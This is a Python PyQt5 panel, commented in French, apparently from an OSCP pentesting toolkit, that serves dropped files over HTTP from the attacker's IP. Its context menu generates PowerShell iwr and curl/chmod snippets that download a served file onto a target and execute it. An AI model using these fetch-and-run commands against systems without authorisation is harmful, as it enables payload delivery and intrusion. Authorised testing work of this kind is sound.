"""File Server Panel — drag-and-drop pour servir des fichiers en HTTP.

Fonctionnement :
  - Drop d'un fichier (depuis explorateur Windows, autre panel, etc.) ->
    le fichier est copie dans un dossier de serving temporaire
    (/tmp/oscp_serving/) et expose via HTTP python
  - Le serveur tourne toujours sur le meme port (defaut 8000). Tous les
    fichiers drop vont dans le meme dossier donc URL = http://LHOST:8000/<filename>
  - L'URL est copiee automatiquement dans le clipboard au drop
  - Liste visuelle des fichiers servis, bouton pour retirer chacun

Pas de securite : tous les types de fichiers acceptes (c'est l'outil local
de l'utilisateur, il sait ce qu'il fait).
"""
from __future__ import annotations

import shutil
import tempfile
from pathlib import Path
from typing import Optional

from PyQt5.QtCore import Qt, pyqtSignal
from PyQt5.QtGui import QDragEnterEvent, QDropEvent
from PyQt5.QtWidgets import (
    QAbstractItemView, QApplication, QFileDialog, QHBoxLayout,
    QHeaderView, QLabel, QMenu, QMessageBox, QPushButton, QSpinBox,
    QTableWidget, QTableWidgetItem, QVBoxLayout, QWidget,
)

from core.file_server import FileServerManager
from core.logger import get_logger
from .widgets import SafeButton

log = get_logger(__name__)


SERVING_DIR = Path(tempfile.gettempdir()) / "oscp_serving"


def _sizeof_fmt(num: int) -> str:
    for unit in ("B", "KB", "MB", "GB"):
        if abs(num) < 1024.0:
            return f"{num:.1f} {unit}"
        num //= 1024
    return f"{num:.1f} TB"


class FileServerPanel(QWidget):
    """Panel drag-drop pour serveur HTTP."""

    def __init__(
        self,
        file_servers: FileServerManager,
        attacker_ip_getter,
        parent: Optional[QWidget] = None,
    ):
        super().__init__(parent)
        self._fs = file_servers
        self._get_ip = attacker_ip_getter

        # Serving dir
        SERVING_DIR.mkdir(parents=True, exist_ok=True)

        # State
        self._current_share = None  # FileShare actif
        self._default_port = 8000

        # Accept drops sur tout le panel
        self.setAcceptDrops(True)

        root = QVBoxLayout(self)
        root.setContentsMargins(6, 6, 6, 6)
        root.setSpacing(6)

        # Controle serveur
        ctrl_row = QHBoxLayout()
        ctrl_row.addWidget(QLabel("Port :"))
        self._port_spin = QSpinBox()
        self._port_spin.setRange(1024, 65535)
        self._port_spin.setValue(self._default_port)
        ctrl_row.addWidget(self._port_spin)

        self._btn_start = SafeButton("Demarrer")
        self._btn_start.clicked.connect(self._on_start_stop)
        ctrl_row.addWidget(self._btn_start)

        self._status_lbl = QLabel("[-] serveur arrete")
        self._status_lbl.setStyleSheet("color:#9e9e9e;")
        ctrl_row.addWidget(self._status_lbl, 1)
        root.addLayout(ctrl_row)

        # Zone drop
        self._drop_zone = QLabel(
            "<center>"
            "<span style='color:#555; font-size:11pt;'>"
            "Glisse-depose un fichier ici pour le servir<br>"
            "<span style='font-size:9pt; color:#777;'>"
            "ou clique 'Ajouter fichier'"
            "</span>"
            "</span>"
            "</center>"
        )
        self._drop_zone.setAlignment(Qt.AlignCenter)
        self._drop_zone.setMinimumHeight(80)
        self._drop_zone.setStyleSheet(
            "QLabel { "
            "background: #1a1a1a; "
            "border: 2px dashed #444; "
            "border-radius: 6px; "
            "padding: 18px; "
            "}"
        )
        root.addWidget(self._drop_zone)

        # Table fichiers servis
        self._table = QTableWidget(0, 3)
        self._table.setHorizontalHeaderLabels(["Fichier", "Taille", "URL"])
        self._table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeToContents)
        self._table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeToContents)
        self._table.horizontalHeader().setSectionResizeMode(2, QHeaderView.Stretch)
        self._table.verticalHeader().setVisible(False)
        self._table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self._table.setAlternatingRowColors(True)
        self._table.setContextMenuPolicy(Qt.CustomContextMenu)
        self._table.customContextMenuRequested.connect(self._on_context_menu)
        self._table.cellDoubleClicked.connect(self._on_copy_url)
        root.addWidget(self._table, 1)

        # Actions
        actions = QHBoxLayout()
        btn_add = SafeButton("+ Ajouter fichier")
        btn_add.clicked.connect(self._on_add_file)
        actions.addWidget(btn_add)

        btn_open_dir = SafeButton("Ouvrir dossier")
        btn_open_dir.clicked.connect(self._open_serving_dir)
        actions.addWidget(btn_open_dir)

        btn_clear = SafeButton("Tout effacer")
        btn_clear.clicked.connect(self._on_clear_all)
        actions.addWidget(btn_clear)

        actions.addStretch()
        root.addLayout(actions)

        # Refresh state
        self._refresh_table()

        # Connect fileservers signals
        self._fs.shares_changed.connect(self._refresh_status)

    # -- Drag & drop ---------------------------------------------------------

    def dragEnterEvent(self, event: QDragEnterEvent) -> None:
        if event.mimeData().hasUrls():
            # Highlight visuel
            self._drop_zone.setStyleSheet(
                "QLabel { background:#1a2c4e; border:2px solid #4fc3f7; "
                "border-radius:6px; padding:18px; }"
            )
            event.acceptProposedAction()
        else:
            event.ignore()

    def dragLeaveEvent(self, event) -> None:
        self._reset_drop_style()
        super().dragLeaveEvent(event)

    def _reset_drop_style(self) -> None:
        self._drop_zone.setStyleSheet(
            "QLabel { background:#1a1a1a; border:2px dashed #444; "
            "border-radius:6px; padding:18px; }"
        )

    def dropEvent(self, event: QDropEvent) -> None:
        self._reset_drop_style()
        if not event.mimeData().hasUrls():
            return

        added = 0
        for url in event.mimeData().urls():
            src = url.toLocalFile()
            if src and Path(src).exists():
                if self._add_file(src):
                    added += 1

        event.acceptProposedAction()
        if added > 0:
            # Demarre le serveur si pas deja actif
            if self._current_share is None:
                self._start_server()
            self._refresh_table()

    # -- File management -----------------------------------------------------

    def _add_file(self, src_path: str) -> bool:
        """Copie src dans le dossier de serving. Retourne True si succes."""
        src = Path(src_path)
        if not src.exists():
            return False
        if src.is_dir():
            QMessageBox.information(
                self, "Info",
                "Les dossiers ne sont pas supportes. "
                "Glisse les fichiers individuellement ou zippe-les."
            )
            return False
        dest = SERVING_DIR / src.name
        try:
            if dest.exists():
                # Overwrite silencieux (on veut pas bloquer le flow)
                dest.unlink()
            shutil.copy2(src, dest)
            log.info("Fichier serving copie : %s -> %s", src, dest)
            # Copie URL dans clipboard
            ip = self._get_ip() or "LHOST"
            port = self._current_share.port if self._current_share else self._port_spin.value()
            url = f"http://{ip}:{port}/{src.name}"
            QApplication.clipboard().setText(url)
            return True
        except OSError as exc:
            QMessageBox.warning(self, "Erreur", f"Copie impossible : {exc}")
            return False

    def _on_add_file(self) -> None:
        paths, _ = QFileDialog.getOpenFileNames(self, "Ajouter fichier(s) a servir")
        changed = False
        for p in paths:
            if self._add_file(p):
                changed = True
        if changed:
            if self._current_share is None:
                self._start_server()
            self._refresh_table()

    def _on_clear_all(self) -> None:
        res = QMessageBox.question(
            self, "Tout effacer",
            f"Supprimer tous les fichiers du dossier {SERVING_DIR} ?",
            QMessageBox.Yes | QMessageBox.No,
        )
        if res != QMessageBox.Yes:
            return
        for f in SERVING_DIR.iterdir():
            try:
                if f.is_file():
                    f.unlink()
            except OSError:
                pass
        self._refresh_table()

    # -- Server control ------------------------------------------------------

    def _on_start_stop(self) -> None:
        if self._current_share is None:
            self._start_server()
        else:
            self._stop_server()

    def _start_server(self) -> None:
        try:
            port = self._port_spin.value()
            share = self._fs.start_http(str(SERVING_DIR), port=port)
            self._current_share = share
            self._btn_start.setText("Arreter")
            self._refresh_status()
            self._refresh_table()
        except Exception as exc:
            QMessageBox.warning(self, "Erreur serveur", str(exc))

    def _stop_server(self) -> None:
        if self._current_share is None:
            return
        try:
            self._fs.stop(self._current_share.id)
        finally:
            self._current_share = None
            self._btn_start.setText("Demarrer")
            self._refresh_status()
            self._refresh_table()

    def _refresh_status(self) -> None:
        if self._current_share:
            ip = self._get_ip() or "LHOST"
            self._status_lbl.setText(
                f"[OK] http://{ip}:{self._current_share.port}/ "
                f"({len(list(SERVING_DIR.glob('*')))} fichiers)"
            )
            self._status_lbl.setStyleSheet("color:#81c784;")
        else:
            self._status_lbl.setText("[-] serveur arrete")
            self._status_lbl.setStyleSheet("color:#9e9e9e;")

    # -- Table ---------------------------------------------------------------

    def _refresh_table(self) -> None:
        files = sorted([p for p in SERVING_DIR.glob("*") if p.is_file()])
        self._table.setRowCount(len(files))
        ip = self._get_ip() or "LHOST"
        port = self._current_share.port if self._current_share else self._port_spin.value()
        for row, p in enumerate(files):
            name_item = QTableWidgetItem(p.name)
            self._table.setItem(row, 0, name_item)
            size_item = QTableWidgetItem(_sizeof_fmt(p.stat().st_size))
            self._table.setItem(row, 1, size_item)
            url = f"http://{ip}:{port}/{p.name}"
            url_item = QTableWidgetItem(url)
            self._table.setItem(row, 2, url_item)

    def _on_copy_url(self, row: int, _col: int) -> None:
        url_item = self._table.item(row, 2)
        if url_item:
            QApplication.clipboard().setText(url_item.text())

    def _on_context_menu(self, point) -> None:
        row = self._table.rowAt(point.y())
        if row < 0:
            return
        menu = QMenu(self)
        name_item = self._table.item(row, 0)
        name = name_item.text() if name_item else ""

        act_copy = menu.addAction("Copier URL")
        act_iwr = menu.addAction("Copier snippet iwr (Windows)")
        act_curl = menu.addAction("Copier snippet curl (Linux)")
        menu.addSeparator()
        act_delete = menu.addAction("Supprimer le fichier")

        chosen = menu.exec_(self._table.viewport().mapToGlobal(point))
        if not chosen:
            return

        url_item = self._table.item(row, 2)
        url = url_item.text() if url_item else ""

        if chosen is act_copy:
            QApplication.clipboard().setText(url)
        elif chosen is act_iwr:
            snippet = f'iwr {url} -OutFile C:\\Windows\\Temp\\{name}; C:\\Windows\\Temp\\{name}'
            QApplication.clipboard().setText(snippet)
        elif chosen is act_curl:
            snippet = f'curl {url} -o /tmp/{name} && chmod +x /tmp/{name} && /tmp/{name}'
            QApplication.clipboard().setText(snippet)
        elif chosen is act_delete:
            try:
                (SERVING_DIR / name).unlink()
                self._refresh_table()
            except OSError as exc:
                QMessageBox.warning(self, "Erreur", str(exc))

    def _open_serving_dir(self) -> None:
        # Subprocess detache pour eviter que le file manager pollue notre stderr
        # (cas chromium-snap qui herite stderr du parent).
        import subprocess
        import shutil as _sh
        for opener in ("xdg-open", "open"):
            path = _sh.which(opener)
            if path:
                try:
                    subprocess.Popen(
                        [path, str(SERVING_DIR)],
                        stdin=subprocess.DEVNULL,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        start_new_session=True,
                        close_fds=True,
                    )
                    return
                except OSError:
                    continue
        # Fallback Qt
        from PyQt5.QtCore import QUrl
        from PyQt5.QtGui import QDesktopServices
        QDesktopServices.openUrl(QUrl.fromLocalFile(str(SERVING_DIR)))
